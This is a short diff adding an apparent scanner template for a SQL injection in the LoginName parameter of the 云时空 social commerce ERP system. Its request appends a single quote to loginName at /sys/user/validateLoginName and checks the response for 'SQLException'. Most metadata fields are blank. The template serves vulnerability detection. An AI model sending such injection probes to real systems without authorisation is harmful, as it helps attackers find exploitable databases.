@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: 云时空社会化商业ERP系统LoginName SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /sys/user/validateLoginName?loginName=admin'
+response1:
+  headers:
+  body: SQLException
+  code: 200
+requests2:
+response2:
